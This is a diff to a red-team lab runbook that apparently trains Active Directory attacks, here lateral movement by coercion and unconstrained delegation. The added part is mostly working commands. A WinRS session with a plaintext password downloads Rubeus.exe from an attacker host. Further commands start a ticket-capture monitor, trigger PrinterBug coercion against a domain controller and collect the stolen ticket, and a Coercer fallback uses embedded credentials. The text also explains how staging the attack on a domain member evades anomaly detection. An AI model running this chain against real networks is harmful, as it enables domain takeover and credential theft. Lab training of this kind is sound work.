@@ -1,10 +1,10 @@
-# CAMPAIGNS v2 — Phase 5 — Lateral Movement (Coercion + Delegation)
+# CAMPAIGNS v3 — Phase 5 — Lateral Movement (Coercion + Delegation)
 
-> **Campaign v2** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA.md`](../CAMPAIGNS-METADATA.md).
-> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v2.md`](../CAMPAIGNS_v2.md) · **Topology:** [`CAMPAIGNS.md`](../CAMPAIGNS.md)
+> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA.md`](../CAMPAIGNS-METADATA.md).
+> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`CAMPAIGNS.md`](../CAMPAIGNS.md)
 > **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
 >
-> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v2.md`](../CAMPAIGNS_v2.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.
+> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.
 
 **Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.
 
@@ -20,16 +20,49 @@
 | ----------------------- | ----------------------------------------------------- |
 | **Target**              | dc02 (.11) — coerced to auth to mbr01                 |
 | **Source of this path** | BloodHound finding: `mbr01$` unconstrained delegation |
-| **From**                | mbr01 (Rubeus monitor) + Kali (Coercer)               |
+| **From**                | **mbr01** (Rubeus monitor) after T101 lateral move    |
+| **MITRE**               | T1187 (Forced Authentication) + T1550.002 (Use Alternate Auth Mat: Kerberos) |
 
 
-1. **Coercer** from Kali triggers `dc02$` to authenticate to mbr01 via MS-RPRN (PrinterBug)
+In the realistic multi-hop flow, **coercion runs from mbr01, not from Kali**. After T101 we already have a command channel on mbr01 as `child\analyst_t1`. From there we stage Rubeus as a listener and coerce dc02$ to authenticate.
 
+#### T102 — Coerce dc02$ to mbr01 from the mbr01 beachhead
+
+**Step 1 — From ws01, open a WinRS session to mbr01 and stage Rubeus:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! powershell -Command "mkdir C:\Tools\cadre-attack -Force; curl -Uri http://192.168.77.60:8888/Rubeus.exe -OutFile C:\Tools\cadre-attack\Rubeus.exe"
+```
+
+**Step 2 — Start Rubeus monitor on mbr01 to capture incoming DC auth:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\cadre-attack\Rubeus.exe monitor /targetuser:DC02$ /interval:5 /filtername:DC02$ /output:C:\Tools\cadre-attack\dc02_tgs.txt"
+```
+
+**Step 3 — Trigger PrinterBug from mbr01 against dc02:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\MS-RPRN.exe \\dc02.child.cadre.local \\mbr01.child.cadre.local"
+```
+
+**Step 4 — Collect the captured TGS on mbr01:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "Get-Content C:\Tools\cadre-attack\dc02_tgs.txt"
+```
+
+**Why this is more realistic:**
+- Real attackers don't keep every tool on their C2 server; they stage on intermediate hosts.
+- Running coercion from mbr01 means the source IP of the coercing traffic is a **legitimate domain member**, making anomaly detection harder.
+- The listener and the trigger are on the same host, reducing cross-host timing artifacts.
+
+**Fallback from Kali (single-hop):** If WinRS lateral movement is blocked, the same coercion can be run directly from Kali for lab-learning purposes:
+
+```bash
 # From Kali: Coerce dc02$ to auth to mbr01
-
-coercer coerce -l 192.168.77.22 -t 192.168.77.11 -d child.cadre.local  
+coercer coerce -l 192.168.77.22 -t 192.168.77.11 -d child.cadre.local \
   -u svc_mssql -p 's3rv1c3_MSSQL!' --spoolsample
-
 ```
 
 #### Alternative Coercion Techniques
